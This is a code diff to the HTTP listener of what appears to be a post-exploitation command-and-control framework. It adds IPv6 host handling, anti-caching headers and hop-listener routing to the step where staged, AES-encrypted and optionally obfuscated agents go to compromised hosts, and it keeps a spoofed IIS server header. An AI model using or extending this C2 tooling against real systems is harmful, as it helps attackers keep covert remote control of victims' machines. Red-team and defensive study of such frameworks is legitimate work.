@@ -97,7 +97,7 @@ class Listener:
                 'Value'         :   ''
             },
             'ServerVersion' : {
-                'Description'   :   'TServer header for the control server.',
+                'Description'   :   'Server header for the control server.',
                 'Required'      :   True,
                 'Value'         :   'Microsoft-IIS/7.5'
             }
@@ -205,6 +205,16 @@ class Listener:
                             pass
 
                 # TODO: reimplement stager retries?
+                #check if we're using IPv6
+                listenerOptions = copy.deepcopy(listenerOptions)
+                bindIP = listenerOptions['BindIP']['Value']
+                port = listenerOptions['Port']['Value']
+                if ':' in bindIP:
+                    if "http" in host:
+                        if "https" in host:
+                            host = 'https://' + '[' + str(bindIP) + ']' + ":" + str(port)
+                        else:
+                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port) 
 
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
@@ -692,6 +702,15 @@ def send_message(packets=None):
             return response
 
 
+        @app.after_request
+        def add_proxy_headers(response):
+            "Add HTTP headers to avoid proxy caching."
+            response.headers['Cache-Control'] = "no-cache, no-store, must-revalidate"
+            response.headers['Pragma'] = "no-cache"
+            response.headers['Expires'] = "0"
+            return response
+
+
         @app.route('/<path:request_uri>', methods=['GET'])
         def handle_get(request_uri):
             """
@@ -780,12 +799,22 @@ def send_message(packets=None):
                     if results:
                         if results.startswith('STAGE2'):
                             # TODO: document the exact results structure returned
+                            if ':' in clientIP:
+                                clientIP = '[' + str(clientIP) + ']'
                             sessionID = results.split(' ')[1].strip()
                             sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
                             dispatcher.send("[*] Sending agent (stage 2) to %s at %s" % (sessionID, clientIP), sender='listeners/http')
 
+                            hopListenerName = request.headers.get('Hop-Name')
+                            try:
+                                hopListener = helpers.get_listener_options(hopListenerName)
+                                tempListenerOptions = copy.deepcopy(listenerOptions)
+                                tempListenerOptions['Host']['Value'] = hopListener['Host']['Value']
+                            except TypeError:
+                                tempListenerOptions = listenerOptions
+
                             # step 6 of negotiation -> server sends patched agent.ps1/agent.py
-                            agentCode = self.generate_agent(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
+                            agentCode = self.generate_agent(language=language, listenerOptions=tempListenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                             encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)
                             # TODO: wrap ^ in a routing packet?
 
